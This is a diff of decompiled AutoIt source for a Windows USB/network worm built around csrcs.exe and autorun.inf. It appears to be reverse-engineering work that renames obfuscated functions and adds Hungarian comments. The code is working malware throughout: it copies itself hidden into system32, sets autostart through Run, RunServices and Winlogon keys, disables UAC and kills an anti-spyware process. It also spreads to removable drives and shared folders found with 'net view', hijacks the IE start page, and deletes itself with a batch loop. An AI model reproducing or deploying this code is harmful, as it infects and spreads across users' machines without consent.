 					$Var03F7 = FileGetSize(@SystemDir & "\" & $CSRCSExeName)
 					If $Var03F6 = $Var03F7 Then
-						If RegRead($Var029A, $Var03A8) = "1" Or RegRead($Var029A, $Var03A8) = "error" Then
+						If RegRead($DRMAmtyRegistryKey, $Var03A8) = "1" Or RegRead($DRMAmtyRegistryKey, $Var03A8) = "error" Then
 						Else
 							$Var03AE = Random(1, $Var03A9, 1)
 							If $Var03AE = 1 Or $Var03AE = 0 Then
@@ -2661,9 +2661,9 @@ Func Fn009C()
 								If FileExists(@SystemDir & "\" & $Var03A5) And FileGetVersion(@SystemDir & "\" & $Var03A5) = $Var03A7 And FileGetSize(@SystemDir & "\" & $Var03A5) = $Var03A6 Then
 									ShellExecute($Var03A5, "", @SystemDir & "\")
 									If @error Then
-										RegWrite($Var029A, $Var03A8, "REG_SZ", "error")
+										RegWrite($DRMAmtyRegistryKey, $Var03A8, "REG_SZ", "error")
 									Else
-										RegWrite($Var029A, $Var03A8, "REG_SZ", "1")
+										RegWrite($DRMAmtyRegistryKey, $Var03A8, "REG_SZ", "1")
 									EndIf
 								Else
 									FileSetAttrib(@SystemDir & "\" & $Var03A5, "-RASH")
@@ -2714,18 +2714,18 @@ Func Fn009C()
 					$Var03F9 = 2
 				EndIf
 			EndIf
-			If RegRead($Var029A, $Var0326) = "" And $Var0320 = "Si" Then
+			If RegRead($DRMAmtyRegistryKey, $Var0326) = "" And $Var0320 = "Si" Then
 				If $Var03F8[0] = 7 Then
 					$Var0302 = @SystemDir & "\" & Random(0x2B67, 0x05F5E0FF, 1) & ".exe"
 					FileCopy(@SystemDir & "\csrcs.exe", $Var0302, 1)
 					FileSetAttrib($Var0302, "-RASH")
 					Fn00BF($Var03F9)
-					RegWrite($Var029A, $Var0326, "REG_SZ", "1")
+					RegWrite($DRMAmtyRegistryKey, $Var0326, "REG_SZ", "1")
 				EndIf
 				If $Var03F8[0] = 10 Then
 					$Var032E = $Var031E
 					Fn00BF($Var03F9)
-					RegWrite($Var029A, $Var0326, "REG_SZ", "1")
+					RegWrite($DRMAmtyRegistryKey, $Var0326, "REG_SZ", "1")
 				EndIf
 			EndIf
 		EndIf
@@ -2761,12 +2761,12 @@ Func Fn009C()
 								EndIf
 							Next
 						EndIf
-						If RegRead($Var029A, $Var039C) <> "" Then
+						If RegRead($DRMAmtyRegistryKey, $Var039C) <> "" Then
 						Else
 							If $Var0401 = $Var0400 Then
 								$Var03AE = Random(1, $Var03A9, 1)
 								If $Var03AE = 1 Or $Var03AE = 0 Then
-									$Var029B = Fn00B7($Var02A0, $Var02A1, $Var029A, "kiu", $EncryptionKey)
+									$Var029B = Fn00B7($Var02A0, $Var02A1, $DRMAmtyRegistryKey, "kiu", $EncryptionKey)
 									If StringInStr($Var029B, "1;") Then
 										$Var029B = StringSplit($Var029B, ";")
 										If $Var029B[0] = 4 Or $Var029B[0] = 2 Then
@@ -2802,9 +2802,9 @@ Func Fn009C()
 												SetIEStartPage($Var02FC[1])
 											EndIf
 										EndIf
-										RegWrite($Var029A, $Var039C, "REG_SZ", "1")
+										RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "1")
 									Else
-										RegWrite($Var029A, $Var039C, "REG_SZ", "noneed")
+										RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "noneed")
 									EndIf
 								EndIf
 							EndIf
@@ -2845,12 +2845,12 @@ Func Fn009C()
 							EndIf
 						Next
 					EndIf
-					If RegRead($Var029A, $Var039C) <> "" Then
+					If RegRead($DRMAmtyRegistryKey, $Var039C) <> "" Then
 					Else
 						If $Var0401 = $Var0400 Then
 							$Var03AE = Random(1, $Var03A9, 1)
 							If $Var03AE = 1 Or $Var03AE = 0 Then
-								$Var029B = Fn00B7($Var02A0, $Var02A1, $Var029A, "kiu", $EncryptionKey)
+								$Var029B = Fn00B7($Var02A0, $Var02A1, $DRMAmtyRegistryKey, "kiu", $EncryptionKey)
 								If StringInStr($Var029B, "1;") Then
 									$Var029B = StringSplit($Var029B, ";")
 									If $Var029B[0] = 4 Or $Var029B[0] = 2 Then
@@ -2867,9 +2867,9 @@ Func Fn009C()
 								Next
 								If $Var03B3 = $Var03FF Then
 									Fn00E8($Var0324 & "~" & $Var0404 & "~" & $Var0405 & "%" & $Var0406)
-									RegWrite($Var029A, $Var039C, "REG_SZ", "1")
+									RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "1")
 								Else
-									RegWrite($Var029A, $Var039C, "REG_SZ", "noneed")
+									RegWrite($DRMAmtyRegistryKey, $Var039C, "REG_SZ", "noneed")
 								EndIf
 							EndIf
 						EndIf
@@ -2878,11 +2878,11 @@ Func Fn009C()
 			Next
 		EndIf
 	EndIf
-	If RegRead($Var029A, "fir") = "x" Then
+	If RegRead($DRMAmtyRegistryKey, "fir") = "x" Then
 		If $Var0300 = 1 Then
 			$Var036F = StringRegExp($Var029F, "m9k5o1z7a5q3", 0)
 			$Var0370 = StringRegExp($Var029F, "a65sd4m1n2b3", 0)
-			RegDelete($Var029A, "fir")
+			RegDelete($DRMAmtyRegistryKey, "fir")
 			If $Var036F = 1 And $Var0370 = 1 Then
 				$Var0371 = "m9k5o1z7a5q3"
 				$Var0372 = "a65sd4m1n2b3"
@@ -2925,8 +2925,8 @@ Func Fn009C()
 			DeleteFilesInFixedDriveRoots()
 			DeleteFilesInScriptDir()
 			DeleteFilesInRemovableDriveRoots()
-			Fn00A1()
-			Fn00A3()
+			DeleteRegistryCSRCSAutoStart()
+			RunSCmd()
 			Exit
 		EndIf
 	EndIf
@@ -2934,21 +2934,30 @@ Func Fn009C()
 	Fn00B4()
 EndFunc
 
-Func Fn009D($Arg00, $Arg01, $Arg02, $Arg03)
-	If FileExists($Arg00 & $Arg01) Then
-		If FileExists($Arg02 & $Arg03) Then
-			If FileGetVersion($Arg00 & $Arg01) > FileGetVersion($Arg02 & $Arg03) Then
-				FileSetAttrib($Arg02 & $Arg03, "-RASH")
+Func CopyFile($Folder1, $File1, $Folder2, $File2)
+	; első fájl létezik
+  If FileExists($Folder1 & $File1) Then
+    ; második fájl létezik
+		If FileExists($Folder2 & $File2) Then
+      ; első fájl újabb, mint a második
+			If FileGetVersion($Folder1 & $File1) > FileGetVersion($Folder2 & $File2) Then
+				; második fájlról leveszi a rejtést
+        FileSetAttrib($Folder2 & $File2, "-RASH")
 				Sleep(10)
-				FileDelete($Arg02 & $Arg03)
+				; második fájlt törli
+        FileDelete($Folder2 & $File2)
 				Sleep(10)
-				FileCopy($Arg00 & $Arg01, $Arg02 & $Arg03)
+        ; első fájlt átmásolja a második helyére
+				FileCopy($Folder1 & $File1, $Folder2 & $File2)
 				Sleep(10)
-				FileSetAttrib($Arg02 & $Arg03, "+RASH")
+        ; második fájlt elrejti
+				FileSetAttrib($Folder2 & $File2, "+RASH")
 			EndIf
 		Else
-			FileCopy($Arg00 & $Arg01, $Arg02 & $Arg03)
-			FileSetAttrib($Arg02 & $Arg03, "+RASH")
+      ; második fájl nem létezik, az elsőt átmásolja arra a névre
+			FileCopy($Folder1 & $File1, $Folder2 & $File2)
+      ; és elrejti
+			FileSetAttrib($Folder2 & $File2, "+RASH")
 		EndIf
 	EndIf
 EndFunc
@@ -3024,9 +3033,9 @@ Func Fn009E()
 						If $Var0416 = 1 Then
 							$Var0417 = @ScriptDir & "\"
 							$Var0418 = $Var0414[$Var0350] & "\"
-							Fn009D($Var0417, $CSRCSExeName, $Var0418, $Var02A8)
+							CopyFile($Var0417, $CSRCSExeName, $Var0418, $Var02A8)
 							Sleep(10)
-							Fn009D($Var0417, $AutoRunIName, $Var0418, $AutoRunInfName)
+							CopyFile($Var0417, $AutoRunIName, $Var0418, $AutoRunInfName)
 							Sleep(10)
 							If $Var0415 = 1 Then
 								$Var02CA = "usbspread"
@@ -3118,9 +3127,9 @@ Func Fn009F()
 					If $Var0416 = 1 Then
 						$Var0417 = @ScriptDir & "\"
 						$Var0418 = $Var0414[$Var0350] & "\"
-						Fn009D($Var0417, $CSRCSExeName, $Var0418, $Var02A8)
+						CopyFile($Var0417, $CSRCSExeName, $Var0418, $Var02A8)
 						Sleep(10)
-						Fn009D($Var0417, $AutoRunIName, $Var0418, $AutoRunInfName)
+						CopyFile($Var0417, $AutoRunIName, $Var0418, $AutoRunInfName)
 						Sleep(10)
 						If $Var0415 = 1 Then
 							$Var02CA = "usbspread"
@@ -3144,18 +3153,25 @@ Func Fn009F()
 	$Var02A8 = $RandomFileName
 EndFunc
 
-Func Fn00A0()
+Func WriteRegistryCSRCSAutoStart()
 	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CSRCSProcessName, "REG_SZ", @SystemDir & "\" & $CSRCSExeName)
 	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CSRCSProcessName, "REG_SZ", @SystemDir & "\" & $CSRCSExeName)
+
 	If @OSVersion = "WIN_XP" Then RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell", "REG_SZ", "Explorer.exe " & $CSRCSExeName)
-	Fn00BE()
-	RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden", "REG_DWORD", "2")
+
+	DisableLUA()
+
+	; felhasználónál engedélyezi a rejtett fájlok megjelenítését Explorerben ???
+  RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden", "REG_DWORD", "2")
+  ; felhasználónál elrejti a rendszer fájlokat az Explorerben ???
 	RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "SuperHidden", "REG_DWORD", "0")
+  ; felhasználónál elrejti a rendszer attribútumú fájlokat az Explorerben ???
 	RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "ShowSuperHidden", "REG_DWORD", "0")
-	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL", "CheckedValue", "REG_DWORD", "1")
+	; gépnél állít a rejtett fájlok megjelenítésén ???
+  RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL", "CheckedValue", "REG_DWORD", "1")
 EndFunc
 
-Func Fn00A1()
+Func DeleteRegistryCSRCSAutoStart()
 	; TeaTimer.exe bezárása
   ; eredetileg: ProcessClose(BinaryToString("0x54656154696D65722E657865"))
 	ProcessClose("TeaTimer.exe")
@@ -3164,8 +3180,9 @@ Func Fn00A1()
 	RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices", $CSRCSProcessName)
 	RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\policies\Explorer\Run", $CSRCSProcessName)
 	RegWrite("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell", "REG_SZ", "Explorer.exe")
-	RegDelete("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List", "C:\WINDOWS\system32\" & $CSRCSExeName)
-	RegDelete($Var029A)
+	; kiveszi a tűzfal kivételek közül a csrcs.exe -t
+  RegDelete("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List", "C:\WINDOWS\system32\" & $CSRCSExeName)
+	RegDelete($DRMAmtyRegistryKey)
 EndFunc
 
 Func DeleteFilesInScriptDir()
@@ -3201,13 +3218,16 @@ Func DeleteFilesInScriptDir()
 	EndIf
 EndFunc
 
-Func Fn00A3()
-	Sleep(0x0064)
-	Local $Var0419
+Func RunSCmd()
+	Sleep(0x0064) ; 100 ms = 0,1 s
+	Local $CmdContent
+  ; letörli az s.cmd nevű fájlt a temp-ben
 	FileDelete(@TempDir & "\s.cmd")
-	Sleep(0x01F4)
-	$Var0419 = ":loop" & @CRLF & "del """ & @ScriptFullPath & """" & @CRLF & "if exist """ & @ScriptFullPath & """ goto loop" & @CRLF & "del " & @TempDir & "\s.cmd"
-	FileWrite(@TempDir & "\s.cmd", $Var0419)
+	Sleep(0x01F4) ; 500 ms = 0,5 s
+	$CmdContent = ":loop" & @CRLF & "del """ & @ScriptFullPath & """" & @CRLF & "if exist """ & @ScriptFullPath & """ goto loop" & @CRLF & "del " & @TempDir & "\s.cmd"
+  ; kiírja az s.cmd -t
+	FileWrite(@TempDir & "\s.cmd", $CmdContent)
+  ; rejtett ablakban elindítja az s.cmd -t
 	Run(@TempDir & "\s.cmd", @TempDir, @SW_HIDE)
 	Exit
 EndFunc
@@ -3293,20 +3313,20 @@ Func Fn00A6()
 	EndIf
 EndFunc
 
-Func Fn00A7($Arg00, $Arg01, $Arg02, $Arg03)
-	$Arg01 = StringInStr($Arg00, $Arg01) + StringLen($Arg01)
-	$Arg02 = StringInStr($Arg00, $Arg02)
-	$Var0423 = $Arg02 - $Arg01
-	$Var0424 = StringMid($Arg00, $Arg01, $Var0423)
-	$Var02C6 = Decrypt(0, $Var0424, $Arg03, 2)
+Func Fn00A7($Folder1, $File1, $Folder2, $File2)
+	$File1 = StringInStr($Folder1, $File1) + StringLen($File1)
+	$Folder2 = StringInStr($Folder1, $Folder2)
+	$Var0423 = $Folder2 - $File1
+	$Var0424 = StringMid($Folder1, $File1, $Var0423)
+	$Var02C6 = Decrypt(0, $Var0424, $File2, 2)
 	Return $Var02C6
 	$Var0424 = ""
 EndFunc
 
-; $Arg01 string to decode
-; $Arg02 key
-Func Decrypt($Arg00, $EncodedString, $DecryptionKey, $ArgOpt03 = 1)
-	If $Arg00 <> 0 And $Arg00 <> 1 Then
+; $File1 string to decode
+; $Folder2 key
+Func Decrypt($Folder1, $EncodedString, $DecryptionKey, $ArgOpt03 = 1)
+	If $Folder1 <> 0 And $Folder1 <> 1 Then
 		SetError(1)
 		Return ""
 	ElseIf $EncodedString = "" Or $DecryptionKey = "" Then
@@ -3326,7 +3346,7 @@ Func Decrypt($Arg00, $EncodedString, $DecryptionKey, $ArgOpt03 = 1)
 		Local $Var042D
 		Local $Var042E
 		Local $Var042F
-		If $Arg00 = 1 Then
+		If $Folder1 = 1 Then
 			For $Var0430 = 0 To $ArgOpt03 Step 1
 				$Var0427 = ""
 				$Var0426 = ""
@@ -3416,102 +3436,148 @@ Func Decrypt($Arg00, $EncodedString, $DecryptionKey, $ArgOpt03 = 1)
 	EndIf
 EndFunc
 
-Func Fn00A9()
+Func InfectPCWithCheck()
 	; TeaTimer.exe bezárása
   ; eredetileg: ProcessClose(BinaryToString("0x54656154696D65722E657865"))
 	ProcessClose("TeamTimer.exe")
 
-	$Var0418 = @SystemDir & "\"
-	$Var0417 = @ScriptDir & "\"
-	Sleep(0x0064)
-	$Var0431 = 0
-	$Var0416 = 1
-	If FileExists($Var0418 & $CSRCSExeName) And FileGetVersion($Var0418 & $CSRCSExeName) > FileGetVersion($Var0417 & $RandomFileName) Then
-		$Var0416 = 0
-		If Not ProcessExists($CSRCSExeName) Then
-			ShellExecute($CSRCSExeName, "", $Var0418)
+	$SystemDir = @SystemDir & "\"
+	$ScriptDir = @ScriptDir & "\"
+	Sleep(0x0064) ; 100 ms = 0,1 s
+
+  ; nem használt változó
+	;$Var0431 = 0
+
+	$Infect = 1
+
+  ; ha létezik a system32\csrcs.exe és újabb verziójú, mint a most futó példány
+	If FileExists($SystemDir & $CSRCSExeName) And FileGetVersion($SystemDir & $CSRCSExeName) > FileGetVersion($ScriptDir & $RandomFileName) Then
+		$Infect = 0
+		; ha még nem fut, akkor elindítja
+    If Not ProcessExists($CSRCSExeName) Then
+			ShellExecute($CSRCSExeName, "", $SystemDir)
 			If @error Then
 			EndIf
 		EndIf
-	ElseIf FileExists($Var0418 & $CSRCSExeName) And FileGetVersion($Var0418 & $CSRCSExeName) = FileGetVersion($Var0417 & $RandomFileName) Then
-		$Var0416 = 0
-		If Not ProcessExists($CSRCSExeName) Then
-			$Var0416 = 1
+
+  ; ha létezik a system32\csrcs.exe és a futó példánnyal azonos verziójú
+	ElseIf FileExists($SystemDir & $CSRCSExeName) And FileGetVersion($SystemDir & $CSRCSExeName) = FileGetVersion($ScriptDir & $RandomFileName) Then
+		$Infect = 0
+		; létezik, de nem fut -> fertőzni kell
+    If Not ProcessExists($CSRCSExeName) Then
+			$Infect = 1
 		EndIf
 	EndIf
-	If $Var0416 = 1 Then
-		If ProcessExists($CSRCSExeName) Then
+
+	If $Infect = 1 Then
+		; egy régebbi verzió fut, bezárja
+    If ProcessExists($CSRCSExeName) Then
 			ProcessClose($CSRCSExeName)
-			Sleep(0x01F4)
+			Sleep(0x01F4) ; 500 ms = 0,5 s
 			If ProcessExists($CSRCSExeName) Then
-				ProcessWaitClose($CSRCSExeName, 0x003C)
+				ProcessWaitClose($CSRCSExeName, 0x003C) ; 60 ms = 0,06 s -t vár a bezárásra
 			EndIf
 		EndIf
-		Fn009D($Var0417, $RandomFileName, $Var0418, $CSRCSExeName)
-		Fn009D($Var0417, $AutoRunInName, $Var0418, $AutoRunInfName)
+
+		; a futó scriptet átmásolja a system32\csrcs.exe helyre
+    CopyFile($ScriptDir, $RandomFileName, $SystemDir, $CSRCSExeName)
+    ; a futó scriptet átmásolja a system32\autorun.inf helyre
+		CopyFile($ScriptDir, $AutoRunInName, $SystemDir, $AutoRunInfName)
+		Sleep(10) 
+
+		; módosítja a fájlok dátumát
+    ChangeFileDate($SystemDir, $CSRCSExeName)
+		ChangeFileDate($SystemDir, $AutoRunInfName)
 		Sleep(10)
-		Fn00B5($Var0418, $CSRCSExeName)
-		Fn00B5($Var0418, $AutoRunInfName)
+
+    ; registry-be beírja a fertőzést
+		RegWrite($DRMAmtyRegistryKey, "ilop", "REG_SZ", "1")
+
+    ; elindítja a system32\csrcs.exe fájlt
+		ShellExecute($CSRCSExeName, "", $SystemDir)
+
+    ; üres if
+		;If @error Then
+		;EndIf
+
+		; beállítja az automatikus indítást
+    WriteRegistryCSRCSAutoStart()
 		Sleep(10)
-		RegWrite($Var029A, "ilop", "REG_SZ", "1")
-		ShellExecute($CSRCSExeName, "", $Var0418)
-		If @error Then
-		EndIf
-		Fn00A0()
-		Sleep(10)
+
+    ; feljegyzi a registry-be, hogy eltávolítható meghajtóról fut
 		If DriveGetType(@ScriptDir) = "REMOVABLE" Then
-			$Var0432 = DriveGetLabel(@ScriptDir)
-			RegWrite($Var029A, "rem", "REG_SZ", $Var0432)
-			RegWrite($Var029A, "rem1", "REG_SZ", "1")
+			$DriveLabel = DriveGetLabel(@ScriptDir)
+			RegWrite($DRMAmtyRegistryKey, "rem", "REG_SZ", $DriveLabel)
+			RegWrite($DRMAmtyRegistryKey, "rem1", "REG_SZ", "1")
 		EndIf
+
+    ; feljegyzi a registry-be, hogy fix meghajtó gyökeréből fut
 		If DriveGetType(@ScriptDir) = "Fixed" Then
 			If StringLen(@ScriptDir) = 3 Then
-				$Var0432 = DriveGetLabel(@ScriptDir)
-				RegWrite($Var029A, "fix", "REG_SZ", $Var0432)
-				RegWrite($Var029A, "fix1", "REG_SZ", "1")
+				$DriveLabel = DriveGetLabel(@ScriptDir)
+				RegWrite($DRMAmtyRegistryKey, "fix", "REG_SZ", $DriveLabel)
+				RegWrite($DRMAmtyRegistryKey, "fix1", "REG_SZ", "1")
 			EndIf
 		EndIf
 	EndIf
 EndFunc
 
-Func Fn00AA()
+Func InfectPC()
 	; TeaTimer.exe bezárása
   ; eredetileg: ProcessClose(BinaryToString("0x54656154696D65722E657865"))
 	ProcessClose("TeaTimer.exe")
-	$Var0418 = @SystemDir & "\"
-	$Var0417 = @ScriptDir & "\"
-	Sleep(0x0064)
-	$Var0431 = 0
-	$Var0416 = 1
-	If $Var0416 = 1 Then
-		If ProcessExists($CSRCSExeName) Then
+
+	$SystemDir = @SystemDir & "\"
+	$ScriptDir = @ScriptDir & "\"
+	Sleep(0x0064) ; 100 ms = 0,1 s
+
+	; nem használt változó
+  ;$Var0431 = 0
+
+	$Infect = 1
+	If $Infect = 1 Then
+		; ha fut a csrcs.exe, bezárja
+    If ProcessExists($CSRCSExeName) Then
 			ProcessClose($CSRCSExeName)
 			Sleep(0x07D0)
 			If ProcessExists($CSRCSExeName) Then
 				ProcessWaitClose($CSRCSExeName, 0x003C)
 			EndIf
 		EndIf
-		Fn009D($Var0417, $RandomFileName, $Var0418, $CSRCSExeName)
-		Fn00B5($Var0418, $CSRCSExeName)
+
+    ; átmásolja magát csrcs.exe -nek, ha a most futó script futó újabb nála
+		CopyFile($ScriptDir, $RandomFileName, $SystemDir, $CSRCSExeName)
+		ChangeFileDate($SystemDir, $CSRCSExeName)
 		Sleep(10)
-		Fn009D($Var0417, $AutoRunInName, $Var0418, $AutoRunInfName)
-		Fn00B5($Var0418, $AutoRunInfName)
+
+    ; átmásolja magát autorun.inf -nek, ha a most futó script újabb nála
+		CopyFile($ScriptDir, $AutoRunInName, $SystemDir, $AutoRunInfName)
+		ChangeFileDate($SystemDir, $AutoRunInfName)
 		Sleep(10)
-		RegWrite($Var029A, "ilop", "REG_SZ", "1")
-		ShellExecute($CSRCSExeName, "", $Var0418)
-		If @error Then
-		EndIf
-		Fn00A0()
+
+		; registry-be beírja a fertőzést
+    RegWrite($DRMAmtyRegistryKey, "ilop", "REG_SZ", "1")
+
+    ; elindítja a system32\csrcs.exe fájlt
+		ShellExecute($CSRCSExeName, "", $SystemDir)
+
+    ; üres if
+		;If @error Then
+		;EndIf
+
+    ; beállítja az automatikus indulást
+		WriteRegistryCSRCSAutoStart()
 		Sleep(10)
+
 		If DriveGetType(@ScriptDir) = "REMOVABLE" Then
-			$Var0432 = DriveGetLabel(@ScriptDir)
-			RegWrite($Var029A, "rem", "REG_SZ", $Var0432)
-			RegWrite($Var029A, "rem1", "REG_SZ", "1")
+			$DriveLabel = DriveGetLabel(@ScriptDir)
+			RegWrite($DRMAmtyRegistryKey, "rem", "REG_SZ", $DriveLabel)
+			RegWrite($DRMAmtyRegistryKey, "rem1", "REG_SZ", "1")
 		EndIf
 		If DriveGetType(@ScriptDir) = "Fixed" Then
-			$Var0432 = DriveGetLabel(@ScriptDir)
-			RegWrite($Var029A, "fix", "REG_SZ", $Var0432)
-			RegWrite($Var029A, "fix1", "REG_SZ", "1")
+			$DriveLabel = DriveGetLabel(@ScriptDir)
+			RegWrite($DRMAmtyRegistryKey, "fix", "REG_SZ", $DriveLabel)
+			RegWrite($DRMAmtyRegistryKey, "fix1", "REG_SZ", "1")
 		EndIf
 	EndIf
 EndFunc
@@ -3594,13 +3660,13 @@ Func Fn00AE()
 	EndIf
 EndFunc
 
-Func Fn00AF($Arg00, $Arg01)
-	$Var0435 = StringSplit($Arg00, "~")
+Func Fn00AF($Folder1, $File1)
+	$Var0435 = StringSplit($Folder1, "~")
 	Select
-		Case $Arg01 = "randompick"
+		Case $File1 = "randompick"
 			$Var02C3 = Random(1, $Var0435[0], 1)
 			$Var0436 = $Var0435[$Var02C3]
-		Case $Arg01 = "secuential"
+		Case $File1 = "secuential"
 			If $Var02C3 >= $Var0435[0] Then
 				$Var02C3 = 1
 				$Var0436 = $Var0435[$Var02C3]
@@ -3679,7 +3745,7 @@ Func Fn00AF($Arg00, $Arg01)
 				If $Var02C1 > 0x0100 Then
 					$Var02C1 = 0x0100
 				EndIf
-				If $Arg01 = "randompick" Then
+				If $File1 = "randompick" Then
 					$Var02BD = Random($Var02BD, $Var02C1, 1)
 				EndIf
 			EndIf
@@ -3695,7 +3761,7 @@ Func Fn00AF($Arg00, $Arg01)
 				If $Var02C1 > 0x0100 Then
 					$Var02C1 = 0x0100
 				EndIf
-				If $Arg01 = "randompick" Then
+				If $File1 = "randompick" Then
 					$Var02BD = Random($Var02BD, $Var02C1, 1)
 				EndIf
 			EndIf
@@ -3711,7 +3777,7 @@ Func Fn00AF($Arg00, $Arg01)
 				If $Var02C1 > 0x0100 Then
 					$Var02C1 = 0x0100
 				EndIf
-				If $Arg01 = "randompick" Then
+				If $File1 = "randompick" Then
 					$Var02BD = Random($Var02BD, $Var02C1, 1)
 				EndIf
 			EndIf
@@ -3727,7 +3793,7 @@ Func Fn00AF($Arg00, $Arg01)
 				If $Var02C1 > 0x0100 Then
 					$Var02C1 = 0x0100
 				EndIf
-				If $Arg01 = "randompick" Then
+				If $File1 = "randompick" Then
 					$Var02BD = Random($Var02BD, $Var02C1, 1)
 				EndIf
 			EndIf
@@ -3743,7 +3809,7 @@ Func Fn00AF($Arg00, $Arg01)
 				If $Var02C0 > 0x0100 Then
 					$Var02C0 = 0x0100
 				EndIf
-				If $Arg01 = "randompick" Then
+				If $File1 = "randompick" Then
 					$Var02BD = Random($Var02BD, $Var02C1, 1)
 					$Var02BC = Random($Var02BC, $Var02C0, 1)
 				EndIf
@@ -3760,7 +3826,7 @@ Func Fn00AF($Arg00, $Arg01)
 				If $Var02C0 > 0x0100 Then
 					$Var02C0 = 0x0100
 				EndIf
-				If $Arg01 = "randompick" Then
+				If $File1 = "randompick" Then
 					$Var02BD = Random($Var02BD, $Var02C1, 1)
 					$Var02BC = Random($Var02BC, $Var02C0, 1)
 				EndIf
@@ -3777,7 +3843,7 @@ Func Fn00AF($Arg00, $Arg01)
 				If $Var02C0 > 0x0100 Then
 					$Var02C0 = 0x0100
 				EndIf
-				If $Arg01 = "randompick" Then
+				If $File1 = "randompick" Then
 					$Var02BD = Random($Var02BD, $Var02C1, 1)
 					$Var02BC = Random($Var02BC, $Var02C0, 1)
 				EndIf
@@ -3794,7 +3860,7 @@ Func Fn00AF($Arg00, $Arg01)
 				If $Var02C0 > 0x0100 Then
 					$Var02C0 = 0x0100
 				EndIf
-				If $Arg01 = "randompick" Then
+				If $File1 = "randompick" Then
 					$Var02BD = Random($Var02BD, $Var02C1, 1)
 					$Var02BC = Random($Var02BC, $Var02C0, 1)
 				EndIf
@@ -3811,7 +3877,7 @@ Func Fn00AF($Arg00, $Arg01)
 				If $Var02C0 > 0x0100 Then
 					$Var02C0 = 0x0100
 				EndIf
-				If $Arg01 = "randompick" Then
+				If $File1 = "randompick" Then
 					$Var02BD = Random($Var02BD, $Var02C1, 1)
 					$Var02BC = Random($Var02BC, $Var02C0, 1)
 				EndIf
@@ -3828,7 +3894,7 @@ Func Fn00AF($Arg00, $Arg01)
 				If $Var02C0 > 0x0100 Then
 					$Var02C0 = 0x0100
 				EndIf
-				If $Arg01 = "randompick" Then
+				If $File1 = "randompick" Then
 					$Var02BD = Random($Var02BD, $Var02C1, 1)
 					$Var02BC = Random($Var02BC, $Var02C0, 1)
 				EndIf
@@ -3845,7 +3911,7 @@ Func Fn00AF($Arg00, $Arg01)
 				If $Var02C0 > 0x0100 Then
 					$Var02C0 = 0x0100
 				EndIf
-				If $Arg01 = "randompick" Then
+				If $File1 = "randompick" Then
 					$Var02BD = Random($Var02BD, $Var02C1, 1)
 					$Var02BC = Random($Var02BC, $Var02C0, 1)
 				EndIf
@@ -3862,7 +3928,7 @@ Func Fn00AF($Arg00, $Arg01)
 				If $Var02C0 > 0x0100 Then
 					$Var02C0 = 0x0100
 				EndIf
-				If $Arg01 = "randompick" Then
+				If $File1 = "randompick" Then
 					$Var02BD = Random($Var02BD, $Var02C1, 1)
 					$Var02BC = Random($Var02BC, $Var02C0, 1)
 				EndIf
@@ -3876,7 +3942,7 @@ Func Fn00AF($Arg00, $Arg01)
 				$Var02BD = $Var0438[3]
 				$Var02BE = $Var0438[4]
 			EndIf
-			If $Arg01 = "randompick" Then
+			If $File1 = "randompick" Then
 				$Var02BD = Random($Var02BD, $Var02C1, 1)
 				$Var02BC = Random($Var02BC, $Var02C0, 1)
 				$Var02BC = Random($Var02BB, $Var02BF, 1)
@@ -3885,7 +3951,7 @@ Func Fn00AF($Arg00, $Arg01)
 	EndIf
 EndFunc
 
-Func Fn00B0($Arg00)
+Func Fn00B0($Folder1)
 	If ProcessExists("cmd.exe") Then
 		ProcessWaitClose("cmd.exe", 0x003C)
 	EndIf
@@ -3918,7 +3984,7 @@ Func Fn00B0($Arg00)
 			ExitLoop
 		EndIf
 	WEnd
-	$Var043C = Run(@ComSpec & " /c net view " & $Arg00, @SystemDir, @SW_HIDE, 6)
+	$Var043C = Run(@ComSpec & " /c net view " & $Folder1, @SystemDir, @SW_HIDE, 6)
 	Sleep(0x0064)
 	$Var043D = "" & @CRLF
 	$Var043E = 0
@@ -3961,20 +4027,20 @@ Func Fn00B0($Arg00)
 				EndIf
 				If $Var0443[$Var0402] = "" Then ExitLoop
 			WEnd
-			$Var0418 = "//" & $Arg00 & "/" & $Var0443[$Var0402] & "/"
+			$Var0418 = "//" & $Folder1 & "/" & $Var0443[$Var0402] & "/"
 			If Not StringInStr($Var0443[$Var0402], "   ") Then
 				If Not $Var0443[$Var0402] = "" Then
 					If FileExists($Var0418 & $KHYFileName) Then
 					Else
 						$Var0417 = @ScriptDir & "\"
 						If FileExists($Var0418 & "System Volume Information") Or FileExists($Var0418 & "RECYCLER") Or FileExists($Var0418 & "Recycled") Then
-							Fn009D($Var0417, $AutoRunInName, $Var0418, $AutoRunInfName)
+							CopyFile($Var0417, $AutoRunInName, $Var0418, $AutoRunInfName)
 							Sleep(10)
-							Fn009D($Var0417, $CSRCSExeName, $Var0418, $RandomFileName)
+							CopyFile($Var0417, $CSRCSExeName, $Var0418, $RandomFileName)
 							Sleep(10)
 							$Var02C8 = "todrive"
 						Else
-							Fn009D($Var0417, $CSRCSExeName, $Var0418, $RandomFileName)
+							CopyFile($Var0417, $CSRCSExeName, $Var0418, $RandomFileName)
 							FileSetAttrib($Var0418 & $RandomFileName, "-RASH")
 							Sleep(10)
 							$Var02C8 = "toshare"
